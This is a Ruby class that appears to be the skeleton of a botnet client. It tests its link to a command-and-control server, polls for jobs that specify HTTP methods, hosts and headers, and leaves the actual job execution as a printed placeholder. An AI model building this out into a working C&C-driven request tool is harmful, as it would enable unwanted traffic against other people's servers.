class Client
	def initialize(server, thread_count)
		@server = server
		@has_job = false
		@node_id = 0
		@thread_count = thread_count

		@job_id = 0
		@http_method = ""
		@http_uri = ""
		@http_host = ""
		@http_headers = ""
		@http_data = ""
	end

	def invoke
		# Make sure we can reach C&C
		cc_stability_test

		while @has_job == false
			# Poll
			job = request_job
			
			@has_job = true if job
		end

		@job_id 		= job["id"]
		@node_id 		= job["node_id"]
		@http_method 	= job["http_method"]
		@http_uri 		= job["http_uri"]
		@http_host 		= job["http_host"]
		@http_headers 	= job["http_headers"]
		@http_data 		= job["http_data"]

		# should probably start computing...
		kick_off_job!
	end

	def request_job
		endpoint = @server + "/poll"

		response = Mechanize.new.get(endpoint)
		# Parse response
		response_parsed = JSON.parse(response.body)
		
		if response_parsed["status"] == "active"
			return response_parsed
		else
			return false
		end
	end

	def kick_off_job!
		puts "Let's just pretend that we're kicking off the job, for now"
	end

	def cc_stability_test
		# Check status to C&C
		cc_agent = Mechanize.new
		response = cc_agent.head(@server)

		if response.code.to_i != 200
			puts "(!) Unable to communicate with command and control server"
			puts "(!) Please confirm address: #{@server}"
			exit
		end
	end
end